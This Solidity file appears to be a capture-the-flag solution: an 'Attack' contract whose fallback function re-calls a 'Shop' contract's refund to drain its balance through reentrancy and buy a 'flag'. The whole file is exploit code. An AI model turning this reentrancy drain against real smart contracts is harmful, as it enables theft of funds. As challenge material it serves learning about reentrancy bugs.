import "./Shop.sol";
contract Attack {
     Shop public shop;
    constructor(address _shopAddress) public payable {
        shop = Shop(_shopAddress);
    }

    function refund() public payable { 
        shop.refund.value(0 ether)(0,1);
    }
    function solve() public payable {
    buyflag();
    //shop.reset();
    //shop.buy.value(5 ether)(0,1);
    //refund();
        
    } 
    function deposit() public payable{
        // Use this to deposit some money in Remix IDE (for testing).
    }
    function buy() public payable {
        shop.buy.value(5 ether)(0,1);
    }
    function buyflag() public payable {
        shop.buy.value(1337 ether)(3,1);
}
    function RetrieveEth() public {
        msg.sender.transfer(address(this).balance); // Get the deposited money back to Remix wallet (for testing).
    }
    
    fallback () external payable{ 
     if (address(shop).balance >= 1000 ether) { 
            refund();
     }   
    }
}
